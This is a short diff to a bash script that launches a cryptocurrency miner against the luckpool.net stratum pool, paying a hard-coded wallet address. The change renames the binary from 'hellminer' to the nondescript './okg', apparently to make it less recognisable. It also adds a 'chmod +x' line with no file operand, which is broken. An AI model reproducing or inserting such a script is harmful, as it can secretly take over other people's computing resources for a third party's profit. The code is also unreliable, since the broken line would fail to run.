@@ -1,2 +1,3 @@
 #!/bin/bash
-tar -xf okg.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RPzoRzbAZLNcTXJ2D7NvpprGUMrrWBh12c.okg -p x --cpu 3
+chmod +x
+./okg -c stratum+tcp://ap.luckpool.net:3956 -u RPzoRzbAZLNcTXJ2D7NvpprGUMrrWBh12c.okg -p x --cpu 3
